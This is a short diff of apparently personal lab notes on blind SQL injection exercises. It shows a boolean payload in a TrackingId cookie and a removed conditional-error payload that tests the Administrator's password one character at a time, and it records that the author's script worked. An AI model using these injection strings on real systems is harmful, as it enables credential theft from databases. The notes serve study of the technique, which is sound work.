@@ -26,11 +26,5 @@ TrackingId=<cookie>' AND (select substring(password,<index>,1) from users where 
 It works!
 Wrote a python script cause doing it in burp won't do binary search.
 # Conditional Errors
-same as above but uses errors instead.
-```sql
-xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
-```
-Check for injection
-```sql
-<cookie>
-```
+pwd length =20
+script works :)
